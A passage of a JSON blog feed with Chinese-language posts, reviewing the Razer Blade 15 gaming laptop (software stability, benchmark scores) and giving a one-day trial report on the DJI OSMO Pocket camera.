可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]